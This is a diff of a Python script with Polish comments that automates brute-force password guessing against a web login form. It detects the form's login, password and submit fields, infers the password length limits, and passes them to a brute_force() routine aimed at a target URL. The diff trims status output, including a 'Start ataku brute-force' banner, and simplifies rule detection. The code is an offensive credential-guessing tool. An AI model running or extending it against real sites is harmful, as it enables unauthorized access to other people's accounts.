@@ -19,40 +19,16 @@ def main():
     parser.add_argument('--submit-field', help='Nazwa pola/przycisku submit (opcjonalnie)')
     args = parser.parse_args()
 
-    print("🔎 Wykrywanie pól formularza logowania...")
+    # Automatyczne wykrywanie pól
     form_info = guess_login_form(args.target_url)
-    print(f"➡️  Znaleziono: {form_info}")
-
     minlen, maxlen = 4, 12
-
-    # Pobierz reguły hasła z formularza (jeśli nie podano ręcznie)
     if args.min_length and args.max_length:
         minlen, maxlen = args.min_length, args.max_length
-        password_rules = {"minlength": minlen, "maxlength": maxlen}
     else:
-        print("🔎 Analizuję pole hasła i jego reguły z formularza...")
+        # Pobierz reguły hasła z formularza
         r = requests.get(args.target_url, timeout=8)
         soup = BeautifulSoup(r.text, "lxml")
-        password_rules = guess_password_rules(soup, form_info["password_field"])
-        minlen = password_rules.get("minlength", 4)
-        maxlen = password_rules.get("maxlength", 12)
-
-    print("\n=== 📝 WYKRYTE REGUŁY POLA HASŁA ===")
-    for key, value in password_rules.items():
-        print(f"  {key}: {value}")
-
-    # Ostrzeżenie gdy nie wykryto wszystkich reguł
-    if "minlength" not in password_rules or "maxlength" not in password_rules:
-        print("⚠️  Nie udało się automatycznie wykryć wszystkich ograniczeń długości hasła. Używam wartości domyślnych lub podanych przez użytkownika.")
-
-    print("\n=== 📝 WYKRYTE POLA FORMULARZA ===")
-    print(f"  login_field:    {args.login_field or form_info['login_field']}")
-    print(f"  password_field: {args.password_field or form_info['password_field']}")
-    print(f"  submit_field:   {args.submit_field or form_info['submit_field']}")
-    print(f"  extra_fields:   {form_info['extra_fields']}")
-    print(f"  method:         {form_info['method']}")
-
-    print("\n🚀 Start ataku brute-force...\n")
+        minlen, maxlen = guess_password_rules(soup, form_info["password_field"])
 
     brute_force(
         url=args.target_url,
